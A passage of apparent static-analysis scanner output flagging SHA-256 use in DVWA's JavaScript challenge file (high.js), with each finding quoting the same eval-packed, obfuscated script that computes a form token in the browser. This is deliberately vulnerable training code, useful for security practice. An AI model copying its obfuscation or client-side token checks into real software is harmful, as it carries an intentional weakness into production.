x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 8937,
        "endLocationLine": 1,
        "endLocationColumn": 8941
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 8966,
        "endLocationLine": 1,
        "endLocationColumn": 8970
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C